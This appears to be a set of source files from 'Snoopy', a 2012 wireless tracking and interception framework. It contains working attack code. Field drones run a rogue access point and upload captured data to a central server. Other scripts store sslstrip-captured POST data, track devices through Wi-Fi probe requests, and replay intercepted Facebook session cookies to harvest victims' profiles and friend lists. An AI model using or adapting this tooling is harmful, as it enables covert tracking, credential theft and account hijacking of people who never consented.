__FILENAME__ = snoopy_gpslogger
#!/usr/bin/python
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

# Script to poll GPS on N900. Quick, dirty, PoC hack. Please rewrite for me.
# Waits for accuracy to be < 100m

import location
import gobject
import sys
import time
import math

if len(sys.argv) < 3:
    sys.stderr.write('Usage:' + sys.argv[0] +' <file_to_write_gps_position_to> <interval_time>\n')
    sys.exit(1)

acc=10000 #100m
prepend_text=sys.argv[3]
sleep_time=int(sys.argv[2])
filename=sys.argv[1]
#print "[+] Will poll GPS until accuracy of %d meters." %(acc/100)


class gps_fix:
	fix=None

	def on_error(self,control, error, data):
	    print "location error: %d... quitting" % error
	    data.quit()
	
	def on_changed(self,device, data):
	    if not device:
	        return
	
	    #Uncomment line below to show progress...
	    cacc= "#Accuracy: %f,%f,%f,%f,%f" %(time.time(),device.fix[4],device.fix[5],device.fix[6]/100,device.fix[11]) 
	    #print cacc
	    #f.write(cacc)
	    #f.write("\n")
	    #f.flush()
	   
	    if not device.fix[6] == device.fix[6]:
	        return
	
	    if device.fix[6] > acc:
	        return
	
	    if device.fix:
	        if device.fix[1] & location.GPS_DEVICE_LATLONG_SET:
		    f=open(filename, "a")
		    #print "[+] GPS coords: (%f,%f) +/- %f" %(device.fix[4],device.fix[5],device.fix[6]/100)
	            pos ="%s,%f,%f,%f,%f" %(prepend_text,time.time(),device.fix[4],device.fix[5],device.fix[6]/100)
		    self.fix=(device.fix[4],device.fix[5])
		    f.write(pos)
		    f.write("\n")
		    f.close()
		    data.stop()
		    #time.sleep(sleep_time)
		    #data.start()
	
	def on_stop(self,control, data):
	    data.quit()
	    #pass
	
	def start_location(self,data):
	    data.start()
	    return False
	
	def __init__(self):
		loop = gobject.MainLoop()
		control = location.GPSDControl.get_default()
		device = location.GPSDevice()
		control.set_properties(preferred_method=location.METHOD_USER_SELECTED,
		                       preferred_interval=location.INTERVAL_DEFAULT)
		
		control.connect("error-verbose", self.on_error, loop)
		device.connect("changed", self.on_changed, control)
		control.connect("gpsd-stopped", self.on_stop, loop)
		
		gobject.idle_add(self.start_location, control)
		
		loop.run()


def haversine(lat1, lon1, lat2, lon2):
	R = 6372.8 # In kilometers
        dLat = math.radians(lat2 - lat1)
        dLon = math.radians(lon2 - lon1)
        lat1 = math.radians(lat1)
        lat2 = math.radians(lat2)

        a = math.sin(dLat / 2) * math.sin(dLat / 2) + math.sin(dLon / 2) * math.sin(dLon / 2) * math.cos(lat1) * math.cos(lat2)
        c = 2 * math.asin(math.sqrt(a))
        return R * c * 1000.0 # In metres

lastPos=(0,0)
while(1):
	g = gps_fix()

	#print lastPos[0],g.fix[0],lastPos[1],g.fix[1] 
	distanceMoved=haversine(lastPos[0],lastPos[1],g.fix[0],g.fix[1])
	#print "Distance moved %f" %distanceMoved
	if( distanceMoved < 100):
		time.sleep(sleep_time)
	lastPos=(g.fix[0],g.fix[1])


########NEW FILE########
__FILENAME__ = create_vpn_conf
#!/usr/bin/python
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

# This script will build an openvpn configuration pack for your client.
# Different client packs are built for different clients, at this stage
# we do:
# -Nokia N900 (assuming pwnphone imaged)
# -Generic Linux (assuming driver support via airmon-ng)

import sys
import os
import ipaddr
import subprocess
import stawk_db
import shutil
import random
import hashlib
import traceback, os.path
import imp
import stat
import re

cursor=stawk_db.dbconnect()
# Load config file
snoopyBinPath=os.path.dirname(os.path.realpath(__file__))
os.chdir(snoopyBinPath)
try:
	f = open('../setup/config')
	data = imp.load_source('data', '', f)
	f.close()
	vpn_server=data.vpn_server
	rsync_user=data.rsync_user
	rsync_user_home=data.rsync_user_home
	web_root=data.web_root
except Exception, e:
	print "Unable to load config file!"
	print e
	sys.exit(-1)

supported=['n900','linux']

def list():
	cursor.execute("SELECT id,download_link FROM drone_conf")
	results=cursor.fetchall()
	print "Existing drone configurations:"
	print "------------------------------"
	for r in results:
		print "http://%s/drone_downloads/%s/%s.tar.gz" %(vpn_server,r[1],r[0])

drone_id,device_type="",""

def menu():
	global device_type
	global drone_id
	print """
+---------------------------------------------------------------+
|                    Welcome to Snoopy V0.1                     |
|                      Drone Configuration                    	|
|                                                               |
|              SensePost Information Security                   |
|         research@sensepost.com / wwww.sensepost.com           |
+---------------------------------------------------------------+

[1] List existing client packs
[2] Create new client pack
[x] Return 
"""
#	sys.stdout.write("Option: ")
#	choice=sys.stdin.read(1)
	choice=raw_input("Option: ")
	if choice == "1":
		list()
		sys.exit(0)
	elif choice == "2":
		print "Devices types currently supported: %s" %supported 
		device_type=""
		drone_id=""
		while device_type not in supported:
			device_type = raw_input("Please enter device type: ")
		while drone_id == "":
			drone_id = raw_input("Please enter a name for your drone (e.g. N900-glenn): ")
	elif choice == "x":
		sys.exit(0)


if( len(sys.argv) < 3):
	menu()

else:

	if sys.argv[1] == "--list":
		list()
		sys.exit(0)
	else:
		drone_id=sys.argv[1]
		device_type=sys.argv[2]

if device_type not in supported:
	print "Error, unsupported device! Your options were:"
	print supported
	exit(-1)

# You probably shouldn't change anything from here
vpn_server_tap="192.168.42.1"
first_ip_tap="192.168.42.2"	#Increment on the least octet, giving /24
first_ip_wifi="10.2.0.1"	#Increment on the second octet, giving /16

ip_tap=""
ip_wifi=""

cursor.execute("SELECT * FROM drone_conf WHERE id=%s", (drone_id))
results=cursor.fetchone()
if( results != None):
	print "[!] Error - client already key exists for '%s'" % drone_id
	exit(-1) 

cursor.execute("SELECT ip_wifi,ip_tap FROM drone_conf ORDER BY INET_ATON(ip_wifi) DESC LIMIT 1")
results=cursor.fetchone()
if( results == None):
	print "[+] Configuring first client"
	ip_tap=first_ip_tap
	ip_wifi=first_ip_wifi
else:
	if( int(results[1].split('.')[3]) >= 255):
		print "[!] My programmer only gave me the ability to create 255 drones. Sorry :("
		exit(1)

	ip_wifi=str(ipaddr.IPAddress(results[0])+2**16)
	ip_tap=str(ipaddr.IPAddress(results[1])+1)

print "[+] Creating VPN client certs..."
try:
	# Epic Hack Battles of History. Know a better way..?
	script="""
#!/bin/bash
sed -i "s/export KEY_CN=.*//" /etc/openvpn/easy-rsa/vars
echo "export KEY_CN=%s" >> /etc/openvpn/easy-rsa/vars
sed -i "/^$/d" /etc/openvpn/easy-rsa/vars
cd /etc/openvpn/easy-rsa
source vars &> /dev/null
./pkitool %s &> /dev/null
""" %(drone_id,drone_id)

	f=open('create_keys.sh','w')
	f.write(script)
	f.close()
	r=subprocess.check_call(['bash ./create_keys.sh'],shell=True)
	os.remove('create_keys.sh')
	if( r != 0):
		print "[!] Error attempting to create client certificate and key"
		exit(-1)

except Exception, e:
	print "[!] Error attempting to create client certificate and key"
	print e
	exit(-1)

# Check to ensure files exist, and are not 0 in length
try:
	files=["/etc/openvpn/easy-rsa/keys/%s.crt"%drone_id,"/etc/openvpn/easy-rsa/keys/%s.csr"%drone_id,"/etc/openvpn/easy-rsa/keys/%s.key"%drone_id,"/etc/openvpn/easy-rsa/keys/ca.crt"]
	for f in files:
		size=os.stat(f).st_size
		fail=False
		if size <= 0:
			fail=True
			print "Error! Created VPN file '%s' is zero length!"%f
	
	if fail == True:
		sys.exit(-1)
except Exception,e:
	print "Exception when inspecting VPN files:"
	print e
	sys.exit(-1)	

print "[+] Writing VPN client configuration..."
	
conf_file="""
;dev tun
dev tap
client
proto tcp
remote %s 1194
resolv-retry infinite
nobind
user nobody
group nogroup
persist-key
persist-tun
ca ca.crt
cert %s.crt
key %s.key
comp-lzo
""" %(vpn_server,drone_id,drone_id)

# Required for N900/maemo over 3G 
if device_type == 'n900':
	conf_file += "\nscript-security 2\nipchange ./add_default_route.sh #Hack required for N900 with 3G"
default_route_file="""#!/bin/sh
gprsroute=`route | grep gprs` ; defroute=`route | grep default | grep G` ; if [ -n "$gprsroute" -a -z "$defroute" ]; then nexthop=`ifconfig gprs0 | grep "inet addr" | cut -d : -f 3 | cut -d " " -f 1` ; route add -host $nexthop dev gprs0 ; route add default gw $nexthop ; fi"""	

#Write CCD directive for the new drone IP
f=open('/etc/openvpn/ccd/%s'%drone_id, 'w')
f.write("ifconfig-push %s 255.255.255.0" % ip_tap)

print "[+] Writing Snoopy client configuration files..."

ds=str(ipaddr.IPAddress(ip_wifi)+1)
de='.'.join(ip_wifi.split('.')[0:2])+'.255.255'
snoopy_config="""
# Modify these if you like, but rather via snoopy.sh
iface=wlan999
delay_between_gps_checks=30
promisc=true
ssid=Internet

# You probably shouldn't change anything from here
arch=%s
device_id=%s

#Vars for rsync
delay_between_syncs=30
sync_server=%s
sync_user=%s
upload_path=%s/snoopy/server/uploads

#Vars for rogueAP
at0_ip=%s
vpn_tap_ip=%s
dhcpd_start=%s
dhcpd_end=%s
dhcpd_mask=255.255.0.0
"""%(device_type,drone_id,vpn_server,rsync_user,rsync_user_home,ip_wifi,vpn_server_tap,ds,de)

save_path="../client_configs/%s/snoopy/"%drone_id
print "[+] Creating SSH keys..."
try:
	shutil.copytree("../../client/",save_path)
	os.makedirs("%s/configs/openvpn"%save_path)
	shutil.copy("/etc/openvpn/easy-rsa/keys/%s.crt"%drone_id, "%s/configs/openvpn"%save_path)
	os.makedirs("%s/snoopy_data/%s"%(save_path,drone_id))
	os.makedirs("%s/configs/ssh"%save_path)
	shutil.copy("/etc/openvpn/easy-rsa/keys/%s.csr"%drone_id, "%s/configs/openvpn"%save_path)
	shutil.copy("/etc/openvpn/easy-rsa/keys/%s.key"%drone_id, "%s/configs/openvpn"%save_path)
	shutil.copy("/etc/openvpn/easy-rsa/keys/ca.crt", "%s/configs/openvpn"%save_path)
	
	tmp=open('/tmp/log','w')
	r=subprocess.check_call(["ssh-keygen -f %s/configs/ssh/id_rsa -N ''"%save_path],shell=True,stdout=tmp)
	key=linestring = open("%s/configs/ssh/id_rsa.pub"%save_path, 'r').read()
	f=open("/home/%s/.ssh/authorized_keys" %rsync_user,"a")

	#Somewhat thin security:
	condom='no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty,command="/usr/bin/rsync ${SSH_ORIGINAL_COMMAND#* }" '
	f.write(condom + key)

	f=open("%s/configs/openvpn/openvpn.conf"%save_path, "w")
	f.write(conf_file)
	f.close()
	f=open("%s/configs/openvpn/add_default_route.sh"%save_path,"w")
	f.write(default_route_file)
	f.close()
	os.chmod("%s/configs/openvpn/add_default_route.sh"%save_path,stat.S_IXOTH) # Sets file +x, or VPN will not execute it
	
	f=open("%s/configs/config"%save_path,"w")
	f.write(snoopy_config)	
	f.close()

	print "[+] Building Snoopy client pack.."
	rand_dir=hashlib.md5(str(random.random())).hexdigest()
	os.makedirs("%s/drone_downloads/%s"%(web_root,rand_dir))
	r=subprocess.check_call(["cd ../client_configs/%s && tar czf %s/drone_downloads/%s/%s.tar.gz *" %(drone_id,web_root,rand_dir,drone_id)], shell=True)	
	print "[+] Done! Client pack can be downloaded via\n    http://%s/drone_downloads/%s/%s.tar.gz" %(vpn_server,rand_dir,drone_id)

except Exception, e:
	print e
	#print "[!] Failed to write keys and configs %d: %s" % (e.args[0], e.args[1])
	exit(-1)

tmp=re.search('(\d+\.\d+)\.\d+\.\d+',ip_wifi)
ip_prefix=tmp.group(1)
cursor.execute("INSERT INTO drone_conf (id,ip_tap,ip_wifi,ip_prefix,download_link) VALUES (%s,%s,%s,%s,%s)", (drone_id,ip_tap,ip_wifi,ip_prefix,rand_dir))

########NEW FILE########
__FILENAME__ = facebook
#!/usr/bin/python
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

# This script will go through web logs looking for Facebook cookies, and extract user details along
# with all of their friends.

import sys
import os
import stawk_db
import re
import time
import requests
import json
from urllib import urlretrieve
import logging

def do_fb(snoopyDir):
	global cursor	

	cursor.execute("SELECT get_fb_from_squid.c_user,get_fb_from_squid.cookies,get_fb_from_squid.client_ip FROM get_fb_from_squid LEFT JOIN facebook ON facebook.degree = 0 AND get_fb_from_squid.c_user = facebook.id WHERE facebook.id IS NULL")
	results=cursor.fetchall()

	for row in results:
		id,cookie,ip=row[0],row[1],row[2]	
		# Get info on the intercepted user
		url='http://graph.facebook.com/%s'%(id)
		cj={}
		headers={"User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)", "Cookie":cookie}
#		for a in cookie.split(';'):
#			k,v=a.split('=')
#			cj[k]=v
#		r = requests.get(url,cookies=cj,headers=headers)
		r = requests.get(url,headers=headers)
		res=json.loads(r.text)		
		ud={'id':'','name':'','first_name':'','last_name':'','link':'','username':'','gender':'','locale':''}

#		intersect = filter(fields.has_key, res.keys())
#		for k in intersect:
#			ud[k]=res[k]

		for r in res:
			if r in ud:
				ud[r]=res[r]

		# Grab profile photo
		if not os.path.exists("%s/web_data/facebook/%s"%(snoopyDir,id)) and not os.path.isdir("%s/web_data/facebook/%s"%(snoopyDir,id)):
			os.makedirs("%s/web_data/facebook/%s"%(snoopyDir,id))
		urlretrieve('http://graph.facebook.com/%s/picture'%id, '%s/web_data/facebook/%s/profile.jpg'%(snoopyDir,id))

		logging.info("New user observed! - %s" %ud['name'])
		logging.info(ud)


		cursor.execute("INSERT IGNORE INTO facebook (ip,id,name,first_name,last_name,link,username,gender,locale,degree) VALUES(%s,%s,%s,%s,%s,%s,%s,%s,%s,0)", (ip,ud['id'],ud['name'],ud['first_name'],ud['last_name'],ud['link'],ud['username'],ud['gender'],ud['locale']))
		

		# Pull his friends list
		url='http://www.facebook.com/ajax/typeahead_friends.php?__a=1&u=%s' %(id)
		r = requests.get(url,cookies=cj,headers=headers)
		res=json.loads(re.sub("for \(;;\);","",r.text))
		friends=res['payload']['friends']

		for friend in friends:
			#Grab their profile photo
	                if not os.path.exists("%s/web_data/facebook/%s"%(snoopyDir,friend['i'])) and not os.path.isdir("%s/web_data/facebook/%s"%(snoopyDir,friend['i'])):
				logging.info("making dir %s/web_data/facebook/%s"%(snoopyDir,friend['i']))
                        	os.makedirs("%s/web_data/facebook/%s"%(snoopyDir,friend['i']))
			else:
				logging.info("Dir exists")

			urlretrieve('http://graph.facebook.com/%s/picture'%friend['i'], '%s/web_data/facebook/%s/profile.jpg'%(snoopyDir,friend['i']))
			cursor.execute("INSERT IGNORE INTO facebook(id,name,link,network,it,degree) VALUES(%s,%s,%s,%s,%s,1)", (friend['i'], friend['t'],friend['u'],friend['n'],friend['it']))
			cursor.execute("INSERT IGNORE INTO facebook_friends (id,friend_id) VALUES(%s,%s)", (id,friend['i']))

def db():
	global cursor
	cursor=stawk_db.dbconnect()

def main(snoopyDir):
	logging.info("Starting Facebook stalker")
	db()


#####REMOVE POST TESTING
	while True:
		do_fb(snoopyDir)
		time.sleep(5)


#TESTGING
#	while True:
#		try:
#			do_fb(snoopyDir)
#		except Exception, e:
#			logging.error("Something bad happened")
#			logging.error(e)
#			db()
#		time.sleep(5)

if __name__ == "__main__":
	logging.basicConfig(level=logging.INFO,format='%(asctime)s %(levelname)s %(filename)s: %(message)s',datefmt='%Y-%m-%d %H:%M:%S')
	main(sys.argv[1])

########NEW FILE########
__FILENAME__ = prox_guid
#!/usr/bin/python
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

# This script creates proximity sessions based on intervals between observed probe requests.

import stawk_db
import string
from random import choice
import time
import logging

# Time without seeing a probe from a device
# to mark the prox session as finished.
proximity_buffer = 600 	# 10 minutes
sleep_for=10		# Rereun every n seconds

def getGuid():
	return ''.join([choice(string.letters + string.digits) for i in range(18)])

def do_prox():
	cursor=stawk_db.dbconnect()
	cursor.execute("SELECT device_mac FROM probes WHERE 1 GROUP BY device_mac HAVING SUM(CASE WHEN proximity_session IS NULL AND timestamp IS NOT NULL THEN 1 ELSE 0 END)>0")
	macs=cursor.fetchall()
	if( len(macs) > 0):
		logging.info("%d devices probing. Grouping into proximity sessions..." %len(macs))
	for row in macs:
		curr_mac=row[0]
		first_row=None
		cursor.execute("SELECT DISTINCT unix_timestamp(timestamp),proximity_session FROM probes where device_mac=%s AND timestamp IS NOT NULL ORDER BY unix_timestamp(timestamp)",curr_mac)
		results=cursor.fetchall()

	
		#Unusual case when only one result
		if(len(results) == 1):
			cursor.execute("UPDATE probes SET proximity_session=%s WHERE device_mac=%s",(getGuid(),curr_mac))
		else:
			# Find first null prox session, and start from the entry before it.
			start_from=0
			while( start_from< len(results)-1 and results[start_from][1] != None):	
				start_from+=1

			if( start_from>0):
				start_from-=1
				prev_prox = results[start_from][1]
			else:
				prev_prox = getGuid()
			start_from+=1
		

			prev_ts=results[start_from-1][0]
			for r in range(start_from,len(results)):
				special_flag=True
				timestamp=results[r][0]

				if( (results[r-1][0]+proximity_buffer) < timestamp):
					cursor.execute("UPDATE probes SET proximity_session=%s WHERE device_mac=%s AND unix_timestamp(timestamp)>=%s AND unix_timestamp(timestamp) <%s", (prev_prox,curr_mac,prev_ts,timestamp))
					prev_prox=getGuid()
					prev_ts=timestamp
					special_flag=False
				else:
					pass	
			if( results[r][1] == None or special_flag):
				cursor.execute("UPDATE probes SET proximity_session=%s WHERE device_mac=%s AND unix_timestamp(timestamp)>=%s AND unix_timestamp(timestamp) <=%s", (prev_prox,curr_mac,prev_ts,timestamp))



def main():
	logging.info("Starting proximity calculator...")

	while True:
		try:
			do_prox()
		except Exception, e:
			print e
		time.sleep(sleep_for)



if __name__ == "__main__":
	logging.basicConfig(level=logging.INFO,format='%(asctime)s %(levelname)s %(filename)s: %(message)s',datefmt='%Y-%m-%d %H:%M:%S')
	main()



########NEW FILE########
__FILENAME__ = pytail
#!/usr/bin/python
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

# This script searches for certain files, and watches them for changes.
# The changes are inserted into the database.

from pytail_helper import LogWatcher
import stawk_db
import re
import urllib2
from publicsuffix import PublicSuffixList
import csv
import time
import sys
import urllib
import pprint
import logging

from warnings import filterwarnings
import MySQLdb as Database
filterwarnings('ignore', category = Database.Warning)

verbose=1
psl = PublicSuffixList()
#cursor=stawk_db.dbconnect()
files=['squid_logs.txt','probe_data.txt', 'coords.txt', 'dhcpd.leases', 'sslstrip_snoopy.log']


def callback(filename, lines):
	if( files[0] in filename):
		if verbose>0:logging.info("New squid logs!")
		squid(lines)
	elif( files[1] in filename):
		if verbose>0:logging.info("New probe data!")
		probe_data(lines)
	elif( files[2] in filename):
		if verbose>0:logging.info("New coord data!")
		coords(lines)
	elif( files[3] in filename):
		if verbose>0:logging.info("New dhcp leases!")
		dhcp(lines)
	elif( files[4] in filename):
		if verbose>0:logging.info("New sslstrip data!")
		sslstrip(lines)
	sys.stdout.flush()

# Thanks Junaid for this method
# If we can figure out how to make squid log POST data (say the first 200 chars) we
# can dispose of this approach.
def sslstrip(lines):
	isEntry = False
	anEntry = {}
	for aLine in lines:
	        if aLine.startswith('2012-') and aLine.find(' Client:') > -1:
	                if isEntry:
	                        processEntry(anEntry)
	                        isEntry = False

	                if aLine.find(' POST Data (') > -1:
	                        isEntry = True
	                        anEntry = {}
	                        anEntry['timestamp'] = aLine[:aLine.find(',')]
	                        anEntry['secure'] = 0
	                        anEntry['post'] = ''
	                        if aLine.find('SECURE POST Data (') > -1:
	                                anEntry['secure'] = 1

	                        tStart = aLine.find(' POST Data (') + 12
	                        anEntry['host'] = aLine[tStart:aLine.find(')', tStart)]
				anEntry['domain']=domain=psl.get_public_suffix(anEntry['host'])

	                        tStart = aLine.find(' Client:') + 8
	                        anEntry['src_ip'] = aLine[tStart:aLine.find(' ', tStart)]

			 	tStart = aLine.find(' URL(') + 8
	                        anEntry['url'] = aLine[tStart:aLine.find(')URL', tStart)]

	        elif isEntry:
	                anEntry['post'] = '%s%s' % (anEntry['post'], urllib.unquote_plus(aLine.strip()))
	if isEntry:
		processEntry(anEntry)

def processEntry(anEntry):
	cursor.execute("INSERT IGNORE INTO sslstrip (timestamp,secure,post,host,domain,src_ip,url) VALUES(%s,%s,%s,%s,%s,%s,%s)",(anEntry['timestamp'],anEntry['secure'],anEntry['post'],anEntry['host'],anEntry['domain'],anEntry['src_ip'],anEntry['url']))


def coords(lines):
	for line in lines:
		line=line.rstrip()
		# e.g N900-glenn,1344619634_27185,1344622644.848847,52.781064,-1.237870,58.640000
		c=line.split(",")
		c[2]=re.sub('\..*','',c[2])
		cursor.execute("INSERT IGNORE INTO gps_movement (monitor_id,run_id,timestamp,gps_lat,gps_long,accuracy) VALUES (%s,%s,FROM_UNIXTIME(%s),%s,%s,%s)",(c[0],c[1],c[2],c[3],c[4],c[5]))
		

def probe_data(lines):
	for line in lines:
		line=line.rstrip()
		# e.g "N900-glenn","1344619634_27185","lough001","00:c0:1b:0b:54:89","tubes","-87","Aug 10, 2012 18:29:58.779969000"
		c=csv.reader([line],delimiter=",")
 		r=next(iter(c), None)
		r[6]=re.sub('\..*','',r[6])
		r[3]=re.sub(':','',r[3]) #Remove colons from mac
		try:
			r[6]=time.mktime(time.strptime(r[6],"%b %d, %Y %H:%M:%S"))	#Until we can update N900's tshark to use frame.time_epoch
		except Exception,e:
			pass
		cursor.execute("INSERT INTO probes (monitor_id,run_id,location,device_mac,probe_ssid,signal_db,timestamp,priority,mac_prefix) VALUES (%s,%s,%s,%s,%s,CONVERT(%s,SIGNED INTEGER),FROM_UNIXTIME(%s),2,%s) ON DUPLICATE KEY UPDATE monitor_id=monitor_id", (r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[3][:6]))

def squid(lines):
	for line in lines:
		line=line.rstrip()
		data=line.split(" ")
		data=map(urllib2.unquote, data)					
		epoch,ip,http_code,method,host,url,ua,cookies=data
		domain=psl.get_public_suffix(host)

		cursor.execute("INSERT INTO squid_logs (timestamp,client_ip,http_code,method,domain,host,url,ua,cookies) VALUES (FROM_UNIXTIME(%s),%s,%s,%s,%s,%s,%s,%s,%s)", (epoch,ip,http_code,method,domain,host,url,ua,cookies) )	


def dhcp(lines):
	for line in lines:
		line=line.rstrip()
		try:
			f=re.search('(.*)\s.*',line)
			line=f.group(1)
			f=re.search('(\S*)\s(\S*)\s(\S*)\s(.*)',line)
			expire,mac,ip,hostname=f.group(1),f.group(2),f.group(3),f.group(4)
			mac=re.sub(':','',mac)
			tmp=re.search('(\d+\.\d+)\.\d+\.\d+',ip)
			ip_prefix=tmp.group(1)
			cursor.execute("INSERT IGNORE INTO dhcp_leases (mac,ip,hostname,expire,mac_prefix,ip_prefix) VALUES (%s,%s,%s,FROM_UNIXTIME(%s),%s,%s)", (mac,ip,hostname,expire,mac[:6],ip_prefix))
			#cursor.execute("INSERT IGNORE INTO dhcp_leases (mac,ip,hostname,expire) VALUES (%s,%s,%s,FROM_UNIXTIME(%s))", (mac,ip,hostname,expire))
		except Exception,e:
			logging.error("Error attempting to parse DHCP file!")
			logging.debug(line)
			logging.debug(e)


def main(searchdir):
	global cursor
	while True:
		cursor=stawk_db.dbconnect()
		try:
			logging.info("Staring database population engine")
			l = LogWatcher(searchdir,files, callback)
			l.loop()
		except Exception, e:
			logging.error("Exception!")
			logging.error(e)
		time.sleep(5)

if __name__ == '__main__':
	logging.basicConfig(level=logging.INFO,format='%(asctime)s %(levelname)s %(filename)s: %(message)s',datefmt='%Y-%m-%d %H:%M:%S')
	logging.info("START")

        if( len(sys.argv) < 2):
                logging.error("[E] Please supply me a directory name to watch. e.g:\n python pytail.py ../uploads/")
                exit(-1)

        searchdir=sys.argv[1]
        logging.info("Watching '%s' for files: %s" %(searchdir, ', '.join(files)))

	main(searchdir)



########NEW FILE########
__FILENAME__ = pytail_helper
#!/usr/bin/env python

# Modified by glenn@sensepost.com to support searching specific files
# and traversing subdirectories

"""
Real time log files watcher supporting log rotation.

Author: Giampaolo Rodola' <g.rodola [AT] gmail [DOT] com>
License: MIT
"""

import os
import time
import errno
import stat
import time
import fnmatch

class LogWatcher(object):
    """Looks for changes in all files of a directory.
    This is useful for watching log file changes in real-time.
    It also supports files rotation.

    Example:

    >>> def callback(filename, lines):
    ...     print filename, lines
    ...
    >>> l = LogWatcher("/var/log/", callback)
    >>> l.loop()
    """

    def __init__(self, folder, files, callback, extensions=["log"], tail_lines=0):
        """Arguments:

        (str) @folder:
            the folder to watch

        (callable) @callback:
            a function which is called every time a new line in a 
            file being watched is found; 
            this is called with "filename" and "lines" arguments.

        (list) @extensions:
            only watch files with these extensions

        (int) @tail_lines:
            read last N lines from files being watched before starting
        """
        self.files_map = {}
        self.callback = callback
        #self.folder = os.path.realpath(folder)
        self.extensions = extensions

	self.filenames = files
	self.folder = folder

        assert os.path.isdir(self.folder), "%s does not exists" \
                                            % self.folder
        assert callable(callback)
        self.update_files()
        # The first time we run the script we move all file markers at EOF.
        # In case of files created afterwards we don't do this.
        for id, file in self.files_map.iteritems():
            file.seek(os.path.getsize(file.name))  # EOF
            if tail_lines:
                lines = self.tail(file.name, tail_lines)
                if lines:
                    self.callback(file.name, lines)

    def __del__(self):
        self.close()

    def loop(self, interval=0.1, async=False):
        """Start the loop.
        If async is True make one loop then return.
        """
        while 1:
            self.update_files()
            for fid, file in list(self.files_map.iteritems()):
                self.readfile(file)
            if async:
                return
            time.sleep(interval)

    def log(self, line):
        """Log when a file is un/watched"""
        #print line
	pass

    def listdir(self):
        """List directory and filter files by extension.
        You may want to override this to add extra logic or
        globbling support.
        """
        ls = os.listdir(self.folder)
        if self.extensions:
            foo= [x for x in ls if os.path.splitext(x)[1][1:] \
                                           in self.extensions]
	    return foo
        else:
            return ls

    @staticmethod
    def tail(fname, window):
        """Read last N lines from file fname."""
        try:
            f = open(fname, 'r')
        except IOError, err:
            if err.errno == errno.ENOENT:
                return []
            else:
                raise
        else:
            BUFSIZ = 1024
            f.seek(0, os.SEEK_END)
            fsize = f.tell()
            block = -1
            data = ""
            exit = False
            while not exit:
                step = (block * BUFSIZ)
                if abs(step) >= fsize:
                    f.seek(0)
                    exit = True
                else:
                    f.seek(step, os.SEEK_END)
                data = f.read().strip()
                if data.count('\n') >= window:
                    break
                else:
                    block -= 1
            return data.splitlines()[-window:]


    def search_files(self):

	files=[]
	for f in self.filenames:
            for result in self.locate(f, self.folder):
		files.append(result)
	return files

	#GRW
    def locate(self,pattern, root=os.curdir):
        '''Locate all files matching supplied filename pattern in and below
	supplied root directory.'''
	for path, dirs, files in os.walk(os.path.abspath(root)):
	    for filename in fnmatch.filter(files, pattern):
	        yield os.path.join(path, filename)


    def update_files(self):
        ls = []
        for name in self.search_files(): #self.listdir():
            absname = name #= os.path.realpath(os.path.join(self.folder, name))
            try:
                st = os.stat(absname)
            except EnvironmentError, err:
                if err.errno != errno.ENOENT:
                    raise
            else:
                if not stat.S_ISREG(st.st_mode):
                    continue
                fid = self.get_file_id(st)
                ls.append((fid, absname))

        # check existent files
        for fid, file in list(self.files_map.iteritems()):
            try:
                st = os.stat(file.name)
            except EnvironmentError, err:
                if err.errno == errno.ENOENT:
                    self.unwatch(file, fid)
                else:
                    raise
            else:
                if fid != self.get_file_id(st):
                    # same name but different file (rotation); reload it.
                    self.unwatch(file, fid)
                    self.watch(file.name)

        # add new ones
        for fid, fname in ls:
            if fid not in self.files_map:
                self.watch(fname)

    def readfile(self, file):
        lines = file.readlines()
        if lines:
            self.callback(file.name, lines)

    def watch(self, fname):
        try:
            file = open(fname, "r")
            fid = self.get_file_id(os.stat(fname))
        except EnvironmentError, err:
            if err.errno != errno.ENOENT:
                raise
        else:
            self.log("watching logfile %s" % fname)
            self.files_map[fid] = file

    def unwatch(self, file, fid):
        # file no longer exists; if it has been renamed
        # try to read it for the last time in case the
        # log rotator has written something in it.
        lines = self.readfile(file)
        self.log("un-watching logfile %s" % file.name)
        del self.files_map[fid]
        if lines:
            self.callback(file.name, lines)

    @staticmethod
    def get_file_id(st):
        return "%xg%x" % (st.st_dev, st.st_ino)

    def close(self):
        for id, file in self.files_map.iteritems():
            file.close()
        self.files_map.clear()


if __name__ == '__main__':

    def callback(filename, lines):


        for line in lines:
	    print "%s changed!" % filename
            print line

   
#    l = LogWatcher.tail("/var/log/squid3/access.log", 3)
#    print dir(l)

    files=['squid_logs.txt','probe_data.txt', 'coords.txt', 'dhcpd.leases']
    searchdir='/home/stawk/uploads/'

    l = LogWatcher(searchdir,files, callback)
    l.loop()




########NEW FILE########
__FILENAME__ = models
"""Contains all SQLAlchemy ORM models."""

from cryptacular import bcrypt
from sqlalchemy import Column
from sqlalchemy import Boolean, CHAR, DateTime, Integer, Numeric, SmallInteger, String
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.ext.hybrid import hybrid_property


crypt = bcrypt.BCRYPTPasswordManager()

def hash_password(password):
    return unicode(crypt.encode(password))


Session = None
Base = declarative_base()


##########
# MODELS #
##########

class Probe(Base):
    __tablename__ = 'probes'

    # COLUMNS #
#    id = Column(Integer, primary_key=True)
    monitor = Column('monitor_id', String(20, convert_unicode=True), default=None, primary_key=True)
    device_mac = Column(CHAR(17), default=None, primary_key=True)
    probe_ssid = Column(String(100, convert_unicode=True), default=None, primary_key=True)
    signal_db = Column(Integer, default=None)
    timestamp = Column(DateTime, default=None, primary_key=True)
    run_id = Column(String(50), default=None)
    location = Column(String(50), default=None)
    proximity_session = Column(String(20), default=None)


class Cookie(Base):
    __tablename__ = 'cookies'

    # COLUMNS #
    id = Column(Integer, primary_key=True)
    device_mac = Column(CHAR(17), nullable=False, default='')
    device_ip = Column(CHAR(15), default=None)
    site = Column(String(256), nullable=False, default='')
    cookie_name = Column(String(256), nullable=False, default='')
    cookie_name = Column(String(4096), nullable=False, default='')


class GpsMovement(Base):
    __tablename__ = 'gps_movement'

    # COLUMNS #
    monitor = Column('monitor_id', String(20, convert_unicode=True), default=None, primary_key=True)
    run_id = Column(String(20), default=None)
